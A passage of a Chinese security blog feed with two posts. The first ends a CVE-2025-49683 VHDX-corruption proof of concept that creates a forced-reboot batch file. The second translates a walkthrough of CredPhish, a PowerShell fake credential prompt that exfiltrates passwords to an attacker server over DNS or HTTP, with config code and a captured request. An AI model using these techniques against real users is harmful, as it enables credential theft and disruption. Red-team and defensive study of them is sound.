&lt;h3 id=&#34;重要警告与注意事项&#34;&gt;重要警告与注意事项
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;仅在测试或隔离环境中运行&lt;/li&gt;
&lt;li&gt;立即重启批处理文件会无警告强制重启系统&lt;/li&gt;
&lt;li&gt;损坏是模拟且微妙的(8KB偏移处)&lt;/li&gt;
&lt;li&gt;影响因操作系统版本和环境而异&lt;/li&gt;
&lt;li&gt;需要管理员权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;损坏偏移：VHDX文件中8192字节(8KB)处&lt;/li&gt;
&lt;li&gt;损坏模式：[0x00, 0xFF, 0x00, 0xFF, 0xDE, 0xAD, 0xBE, 0xEF]字节序列&lt;/li&gt;
&lt;li&gt;磁盘初始化：MBR分区样式，单个NTFS分区&lt;/li&gt;
&lt;li&gt;重启命令：&lt;code&gt;shutdown /r /t 0 /f&lt;/code&gt;强制立即重启&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;示例输出&#34;&gt;示例输出
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vbnet&#34; data-lang=&#34;vbnet&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;正在检查现有VHDX文件以避免冲突&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;创建新的VHDX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;虚拟硬盘&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;文件&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;大小&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;路径&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MicrosoftLoosers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CVE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;49683&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;corrupted_test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vhdx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;正在挂载新的VHDX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;磁盘已初始化为NTFS格式&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;驱动器挂载为E&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;正在卸载VHDX以应用损坏&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;通过在8KB偏移处修改字节模拟损坏&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[+]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;损坏应用成功&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;重新挂载损坏的VHDX观察效果&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;创建立即重启批处理脚本&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;your&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;salaries&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bat&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;许可证与免责声明&#34;&gt;许可证与免责声明
&lt;/h3&gt;&lt;p&gt;本脚本仅用于教育和研究目的。作者和分发者对任何滥用造成的损害不承担责任。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;参考&#34;&gt;参考
&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49683&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2025-49683&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/nu11secur1ty/CVE-mitre/tree/main/2025/CVE-2025-49683&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;源代码&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用PowerShell进行用户密码钓鱼的技术解析</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8powershell%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%92%93%E9%B1%BC%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 18:13:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8powershell%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%92%93%E9%B1%BC%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;使用powershell进行用户密码钓鱼的技术解析&#34;&gt;使用PowerShell进行用户密码钓鱼的技术解析
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;tokyoneon&lt;/strong&gt; //&lt;br&gt;
伪造凭证提示是一种有效的权限提升和横向移动技术。在Windows环境中，用户经常会遇到看似随机的密码提示，例如Outlook、VPN和其他各种认证协议。攻击者会滥用Windows和PowerShell内置功能来调用凭证弹窗以获取用户密码。&lt;/p&gt;
&lt;p&gt;根据&lt;strong&gt;MITRE ATT&amp;amp;CK框架&lt;/strong&gt;的定义：&lt;br&gt;
“当需要额外权限的程序执行时，操作系统通常会提示用户输入正确的凭证以授权任务的提升权限。攻击者可能会模仿常见的操作系统组件，通过PowerShell等语言显示看似合法的凭证提示。”&lt;/p&gt;
&lt;h2 id=&#34;什么是credphish&#34;&gt;什么是CredPhish？
&lt;/h2&gt;&lt;p&gt;CredPhish是一个PowerShell脚本，旨在调用凭证提示并窃取密码。它依赖于&lt;strong&gt;CredentialPicker API&lt;/strong&gt;收集用户密码，使用PowerShell的&lt;strong&gt;Resolve-DnsName&lt;/strong&gt;进行DNS外传数据，并利用Windows Defender的&lt;strong&gt;ConfigSecurityPolicy.exe&lt;/strong&gt;执行任意GET请求。&lt;/p&gt;
&lt;p&gt;下图展示了CredPhish的实际操作。请注意，在Windows安全提示中提交凭证后，凭证会立即发送到攻击者的DNS服务器。&lt;/p&gt;
&lt;p&gt;默认情况下，CredPhish会使用PowerShell内置的DNS解析器&lt;strong&gt;Resolve-DnsName&lt;/strong&gt;外传凭证。它会将凭证中的每个字符转换为十六进制值，将转换后的值分成预定义的块，并将这些块放入热门网站的子域名中。以下截图显示了十六进制形式的外传凭证示例。注意“tokyoneon”的十六进制值（746f6b796f6e656f6e）出现在google.com和office.com的子域名中。&lt;/p&gt;
&lt;p&gt;在解析DNS查询之前，DNS服务器会剥离十六进制子域名以避免生成大量错误响应。在下面的Wireshark截图中，请注意“Answers”字段不再包含子域名，并成功解析为Google的一个IP地址。&lt;/p&gt;
&lt;h2 id=&#34;credphishps1配置&#34;&gt;CredPhish.ps1配置
&lt;/h2&gt;&lt;p&gt;CredPhish.ps1设计为一个独立的脚本，不需要&lt;strong&gt;Import-Module&lt;/strong&gt;（这是一种常见的攻击指标）。可配置选项以变量的形式位于PS1脚本的顶部，以避免冗长的命令行参数。&lt;/p&gt;
&lt;p&gt;第一行是最重要的，它定义了外传数据的接收地址（即攻击者的Kali服务器）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# exfil address  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$exfilServer&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.56.112&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;接下来的几个变量定义了提示框对目标用户的显示方式。&lt;strong&gt;$promptCaption&lt;/strong&gt;定义了请求凭证的“应用程序”（例如“Microsoft Office”），而**$promptMessage**通常指定与请求关联的账户。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# prompt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$targetUser&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$env:username&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$companyEmail&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blackhillsinfosec.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$promptCaption&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Microsoft Office&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$promptMessage&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Connecting to: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$targetUser&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$companyEmail&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$maxTries&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 提示框的最大调用次数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$delayPrompts&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 提示框之间的延迟（秒）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$validateCredentials&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 如果凭证有效，则中断$maxTries并立即外传&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;$maxTries&lt;/strong&gt;变量定义了提示框在目标提交凭证之前显示的次数。默认值为&lt;strong&gt;1&lt;/strong&gt;以避免引起怀疑。&lt;strong&gt;$delayPrompts&lt;/strong&gt;变量定义了每次提示之间的延迟时间（如果**$maxTries&lt;strong&gt;大于1）。&lt;/strong&gt;$validateCredentials&lt;strong&gt;默认禁用，它会尝试通过在高权限上下文中使用&lt;/strong&gt;Start-Process&lt;strong&gt;来本地验证提交的凭证。如果启用且凭证验证通过，则忽略&lt;/strong&gt;$maxTries**，数据会立即发送到攻击者的服务器。&lt;/p&gt;
&lt;h2 id=&#34;数据外传方法&#34;&gt;数据外传方法
&lt;/h2&gt;&lt;p&gt;如前所述，DNS外传是默认的密码传输方法。&lt;strong&gt;$exfilDomains&lt;/strong&gt;列表包含用于DNS查询的各种域名，并随机选择。&lt;strong&gt;$subdomainLength&lt;/strong&gt;变量确定每个子域名的期望长度。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# dns&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 在Kali中启动DNS服务器：python3 /path/to/credphish/dns_server.py&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$enableDnsExfil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$exfilDomains&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.microsoft.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.google.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.office.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.live.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 用于DNS外传的域名&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$randomDelay&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;get-random&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-minimum&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-maximum&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# DNS查询之间的随机延迟&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$subdomainLength&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 子域名的最大字符数。必须是2-60之间的偶数，否则查询会中断&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;要拦截通过DNS外传功能发送的凭证，请在Kali中执行&lt;strong&gt;dns_server.py&lt;/strong&gt;脚本。按&lt;strong&gt;Ctrl + c&lt;/strong&gt;终止DNS服务器，它将重建拦截的明文凭证。&lt;/p&gt;
&lt;p&gt;CredPhish内置的另一种外传方法是HTTP请求。它利用Windows Defender中包含的二进制文件“ConfigSecurityPolicy.exe”将凭证发送到攻击者的服务器。将**$enableHttpExfil&lt;strong&gt;变量设置为&lt;/strong&gt;$true**以启用它。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# http&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 在Kali中启动HTTP服务器：python3 -m http.server 80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$enableHttpExfil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ConfigSecurityPolicy&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Prog*Files\Win*Defender\ConfigSecurityPolicy.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;要拦截通过&lt;strong&gt;ConfigSecurityPolicy.exe&lt;/strong&gt;发送的凭证，请在Kali中启动一个简单的HTTP服务器以在日志中捕获它们。&lt;/p&gt;
&lt;p&gt;在网络中，外传的凭证会显示如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_%26ecuRe-P%40ssw%25rD%23%5D HTTP/1.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: */*  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UA-CPU: AMD64  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Encoding: gzip, deflate  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 192.168.56.104  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: Keep-Alive
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;由于凭证在传输前进行了URL编码，可以使用Burp的Decoder模块或Python的&lt;strong&gt;urllib&lt;/strong&gt;库通过命令行进行URL解码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
